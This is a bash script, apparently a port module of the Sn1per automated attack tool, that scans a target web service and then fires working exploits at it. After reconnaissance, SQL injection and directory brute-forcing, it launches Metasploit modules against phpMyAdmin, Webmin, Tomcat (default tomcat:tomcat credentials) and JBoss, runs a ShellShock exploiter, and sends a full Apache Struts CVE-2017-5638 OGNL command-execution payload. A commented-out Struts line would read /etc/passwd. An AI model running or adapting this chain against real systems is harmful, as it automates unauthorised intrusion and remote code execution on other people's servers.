#!/bin/bash

VER="2.5"
TARGET="$1"
MODE="$2"
OPT1="$3"
DISABLE_POSTGRESQL="true" # disabling postgresql startup, assuming it's running already
INSTALL_DIR="/usr/share/sniper"
LOOT_DIR="/usr/share/sniper/loot"
PLUGINS_DIR="/usr/share/sniper/plugins"
CMSMAP="/usr/share/sniper/plugins/CMSmap/cmsmap.py"
SAMRDUMP="/usr/share/sniper/bin/samrdump.py"
DNSDICT6="/usr/share/sniper/bin/dnsdict6"
INURLBR="/usr/share/sniper/bin/inurlbr.php"
USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
PASS_FILE="/usr/share/brutex/wordlists/password.lst"
DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3128,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
DEFAULT_TCP_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3306,3128,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152"
DEFAULT_UDP_PORTS="53,67,68,88,161,162,137,138,139,389,520,2049"
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
REGEX='^[0-9]+$'

# ENABLE/DISABLE AUTOMATIC BRUTE FORCE
# DEFAULT IS "1" (ENABLED)
AUTOBRUTE="1"

# ENABLE/DISABLE FULL DETAILED NMAP SCAN
# DEFAULT IS "1" (ENABLED)
FULLNMAPSCAN="1"

# ENABLE/DISABLE AUTOMATIC GOOGLE HACKING QUERIES
# DEFAULT IS "1" (ENABLED)
GOOHAK="1"

# ENABLE AUTO UPDATES
# DEFAULT IS "1" (ENABLED)
ENABLE_AUTO_UPDATES="1"

cd $INSTALL_DIR

if [[ ${TARGET:0:1} =~ $REGEX ]];
	then
	SCAN_TYPE="IP"
else
	SCAN_TYPE="DOMAIN"
fi
	echo -e "$OKORANGE + -- --=[Port http or https opened... running tests...$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
	wafw00f http://$TARGET:$MODE | tee $LOOT_DIR/notes/wafw00f"$MODE"_out.txt
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
	whatweb http://$TARGET:$MODE | tee $LOOT_DIR/notes/whatweb"$MODE"_out.txt
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET:$MODE | egrep -i 'X-Content' | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET:$MODE | egrep -i 'X-Frame' | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET:$MODE | egrep -i 'X-XSS' | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo""
	$RESET
	xsstracer $TARGET $MODE| tee $LOOT_DIR/notes/xsstracer"$MODE"_out.txt
	echo""
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking HTTP methods on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X OPTIONS http://$TARGET:$MODE | grep Allow | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X TRACE http://$TARGET:$MODE | grep TRACE | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for META tags on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET:$MODE | egrep -i meta --color=auto | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for open proxy on $TARGET...$RESET $OKORANGE"
	curl -x http://$TARGET:$MODE -L http://crowdshield.com/.testing/openproxy.txt -s --insecure | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Enumerating software on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET:$MODE | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET:$MODE | egrep -i "Strict-Transport-Security" | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET:$MODE/crossdomain.xml | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET:$MODE/clientaccesspolicy.xml | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET:$MODE | egrep -i "Access-Control-Allow-Origin" | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving robots.txt on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET:$MODE/robots.txt | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving sitemap.xml on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET:$MODE/sitemap.xml | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking cookie attributes on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET:$MODE | egrep -i "Cookie:" | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET:$MODE/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10| tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	curl -s --insecure http://$TARGET:$MODE/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10 | tee -a $LOOT_DIR/notes/httpHeaders"$MODE"_out.txt
	echo ""
	echo -e "$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
	nikto -h http://$TARGET:$MODE -output $LOOT_DIR/nmap/nmapNIKTO"$MODE"-$TARGET.xml
	echo -e "$OKGREEN + -- ----------------------------=[Saving Initial Web Screenshot]=------------------ -- +$RESET"
	cutycapt --url=http://$TARGET:$MODE --out=$LOOT_DIR/screenshots/$TARGET-port"$MODE".jpg
	#echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port"$MODE".jpg"

		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
		nmap -A -sV -T4 -Pn -p "$MODE" --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET -oX $LOOT_DIR/nmap/nmap"$MODE"-$TARGET.xml
		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
		dirb http://$TARGET:$MODE /usr/share/wordlists/dirb/big.txt -o $LOOT_DIR/notes/dirb"$MODE"_out.txt
		rm $LOOT_DIR/notes/dirb"$MODE"_directories.txt
		rm -rf $LOOT_DIR/notes/dirb"$MODE"Ext
		cat $LOOT_DIR/notes/dirb"$MODE"_out.txt | grep "==>" | cut -f3 -d ' ' > $LOOT_DIR/notes/dirb"$MODE"_directories.txt
		DIRB443DIR="$(cat $LOOT_DIR/notes/dirb"MODE"_directories.txt)"
		if [ -n "$DIRB443DIR" ]; then
			echo -e "$OKGREEN + -- ----------------------------=[Finding txt, php, and html Files In Directories]=----------- -- +$RESET"
			mkdir $LOOT_DIR/notes/dirb"$MODE"Ext
			for a in `cat $LOOT_DIR/notes/dirb"$MODE"_directories.txt`; do dirb $a -X .txt,.php,.html -o $LOOT_DIR/notes/dirb"$MODE"Ext/$(echo $a | sed -e 's/\//_/g').txt; done;
			cat $LOOT_DIR/notes/dirb"$MODE"Ext/*.txt | grep "+" | cut -d " " -f2 > $LOOT_DIR/notes/dirb"$MODE"Ext/dirb"$MODE"FoundFiles.txt

			DIRB443SHOTS="$(cat $LOOT_DIR/notes/dirb"$MODE"Ext/dirb"$MODE"FoundFiles.txt)"
			if [ -n "$DIRB443SHOTS" ]; then
				echo -e "$OKGREEN + -- ----------------------------=[Making Screenshots of txt, php, and html Files In Found Directories]=----------- -- +$RESET"
				for a in `cat $LOOT_DIR/notes/dirb"$MODE"Ext/dirb"$MODE"FoundFiles.txt`; do cutycapt --url=$a --out=$LOOT_DIR/screenshots/$(echo $a | sed -e 's/\//_/g')-port443.jpg; done;
				find $LOOT_DIR/screenshots/ -size -10k -exec rm -f {} \; 2> /dev/null
			else
				echo -e "$OKORANGE + No Files Found by Dirb +$RESET"
			fi
		else
			echo -e "$OKORANGE + No Directories Found by Dirb +$RESET"
		fi

		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
		wpscan --url http://$TARGET:$MODE --batch | tee $LOOT_DIR/notes/wpscanA"$MODE"_out.txt
		echo ""
		wpscan --url http://$TARGET:$MODE/wordpress/ --batch | tee $LOOT_DIR/notes/wpscanB"$MODE"_out.txt
		echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
		python $CMSMAP -t http://$TARGET:$MODE | tee $LOOT_DIR/notes/cmsmapA"$MODE"_out.txt
		echo ""
		python $CMSMAP -t http://$TARGET:$MODE/wordpress/ | tee $LOOT_DIR/notes/cmsmapBA"$MODE"_out.txt
		echo ""
		if [ $ARACHNI == "1" ];
		then
			echo -e "$OKGREEN + -- ----------------------------=[Skipping Arachni Scan]=------------------- -- +$RESET"
		else
			echo -e "$OKGREEN + -- ----------------------------=[Running Arachni Web Application Scan]=---- -- +$RESET"
			mkdir -p $INSTALL_DIR/loot/web/$TARGET-http/ 2> /dev/null
			arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-https/ --output-only-positives http://$TARGET:$MODE
			cd $INSTALL_DIR/loot/web/$TARGET-https/
			arachni_reporter $INSTALL_DIR/loot/web/$TARGET-http/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-http/arachni.zip
			unzip $INSTALL_DIR/loot/web/$TARGET-http/arachni.zip
			cd $INSTALL_DIR	sslscan --no-failed $TARGET:$MODE | tee $LOOT_DIR/notes/sslscan$MODE_out.txt
		fi

		echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
		sqlmap -u "http://$TARGET:$MODE" --batch --crawl=5 --level 1 --risk 1 -f -a | tee $LOOT_DIR/notes/sqlmap"$MODE"_out.txt

		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT "$MODE"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;" | tee $LOOT_DIR/notes/msfconsole"$MODE"php_out.txt

		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
		python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port "$MODE" --ssl

		echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
		curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://$TARGET:$MODE | head -n 1 | tee $LOOT_DIR/notes/jakarta"$MODE"_out.txt

		echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
		sslscan --no-failed $TARGET | tee $LOOT_DIR/notes/sslscan"$MODE"_out.txt
		sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:$MODE | tee $LOOT_DIR/notes/sslyze8443_out.txt
		cd $PLUGINS_DIR/MassBleed
		./massbleed $TARGET port $MODE | tee $LOOT_DIR/notes/massbleed$MODE_out.txt
		cd $INSTALL_DIR
		testssl $TARGET | tee $LOOT_DIR/notes/testssl_out.txt


		echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
		msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$MODE"; run; exit;" | tee $LOOT_DIR/notes/msfconsole"$MODE"webadmin_out.txt

		echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
		msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT $MODE; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;" | tee $LOOT_DIR/notes/msfconsole"$MODE"tomcat_out.txt
		msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; setg RPORT "$MODE"; run;" | tee $LOOT_DIR/notes/msfconsole"$MODE"jboss_out.txt
		# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
		# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;" | tee $LOOT_DIR/notes/msfconsole"$MODE"struts_out.txt
		echo -e "$OKGREEN + -- ----------------------------=[Exiting Sniper sh script]=---- -- +$RESET"
		exit
